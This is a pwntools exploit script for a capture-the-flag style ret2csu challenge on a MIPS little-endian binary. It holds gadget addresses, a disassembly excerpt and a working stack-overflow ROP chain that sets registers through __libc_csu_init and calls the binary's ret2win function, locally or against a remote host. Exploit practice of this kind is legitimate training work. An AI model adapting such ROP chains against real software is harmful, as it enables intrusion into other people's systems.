from pwn import *

splash()
elf = context.binary = ELF("./ret2csu_mipsel")


class ROP:
    load_args = 0x004009a0  # lw $t9, ($s0); addiu $s1, $s1, 1; move $a2, $s5; move $a1, $s4; jalr $t9; move $a0, $s3;
    csu       = 0x004009c0
    lw_ra     = 0x004006e0  # lw $ra, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x20;
    fini_got  = 0x00411030


"""
  4009c0:	8fbf0034 	lw	ra,52(sp)
  4009c4:	8fb50030 	lw	s5,48(sp)
  4009c8:	8fb4002c 	lw	s4,44(sp)
  4009cc:	8fb30028 	lw	s3,40(sp)
  4009d0:	8fb20024 	lw	s2,36(sp)
  4009d4:	8fb10020 	lw	s1,32(sp)
  4009d8:	8fb0001c 	lw	s0,28(sp)
  4009dc:	03e00008 	jr	ra
  4009e0:	27bd0038 	addiu	sp,sp,56
-------------------------------------------
00400670 <_init>:
  400670:       3c1c0002        lui     gp,0x2
  400674:       279c89a0        addiu   gp,gp,-30304
  400678:       0399e021        addu    gp,gp,t9
  40067c:       27bdffe0        addiu   sp,sp,-32
  400680:       afbc0010        sw      gp,16(sp)
  400684:       afbf001c        sw      ra,28(sp)
  400688:       8f828044        lw      v0,-32700(gp)
  40068c:       10400004        beqz    v0,4006a0 <_init+0x30>
  400690:       00000000        nop
  400694:       8f998044        lw      t9,-32700(gp)
  400698:       0320f809        jalr    t9
"""


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)


def solve():
    io = conn()

    padding = cyclic(36)

    payload = [
        padding,
        ROP.csu,
        0xCAFEBABE,
        0xCAFEBABE,
        0xCAFEBABE,
        0xCAFEBABE,
        0xCAFEBABE,
        0xCAFEBABE,
        0xCAFEBABE,
        ROP.fini_got,  # s0 => lw $t9, ($s0)
        0xd00df00d,  # s1; CONDITION s1 == s2 but 0x4009a4 <__libc_csu_init+100>    addiu  $s1, $s1, 1
        0xd00df00e,  # s2; means we have to add 1 to s2
        0xdeadbeef,  # s3
        0xcafebabe,  # s4
        0xd00df00d,  # s5
        ROP.load_args,  # ra
        0xCAFEBABE,
        0xCAFEBABE,
        0xCAFEBABE,
        0xCAFEBABE,
        0xCAFEBABE,
        0xCAFEBABE,
        0xCAFEBABE,
        0,
        1,
        2,
        3,
        4,
        5,
        elf.plt.ret2win
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()